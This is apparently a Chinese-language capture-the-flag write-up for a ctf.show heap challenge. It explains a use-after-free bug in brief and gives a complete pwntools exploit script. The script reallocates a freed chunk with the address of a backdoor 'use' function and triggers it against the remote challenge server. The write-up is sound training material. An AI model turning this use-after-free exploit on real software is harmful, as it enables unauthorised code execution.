# 挑战简介
使用已释放的内存

- 远程环境：Ubuntu 18.04

# 思路 
释放堆内存时，指针没有置NULL，这就会导致UAF漏洞(use after free)，利用free，搭配use(后门函数)可以实现利用  

```
from pwn import *
from LibcSearcher import *
#context(arch = "amd64",os = 'linux',log_level = 'debug')
context(arch = "i386",os = 'linux',log_level = 'debug')
#io = process("./pwn")  
io = remote('pwn.challenge.ctf.show', 28115)
elf = ELF('D:\edge 下载\pwn')

use = elf.sym['use']

def add(size,content):
    io.recvuntil(b'choice :')
    io.sendline(b'1')
    io.recvuntil(b':')
    io.sendline(str(size).encode())
    io.recvuntil(b':')
    io.send(content)

def delete(index):
    io.recvuntil(b'choice :')
    io.sendline(b'2')
    io.recvuntil(b':')
    io.sendline(str(index).encode())

def show(index):
    io.recvuntil(b'choice :')
    io.sendline(b'3')
    io.recvuntil(b':')
    io.sendline(str(index).encode())

add(32, b'aaaa')
add(32, b'bbbb')
delete(0)
delete(1)
add(8, p32(use))
show(0)

io.interactive()
```
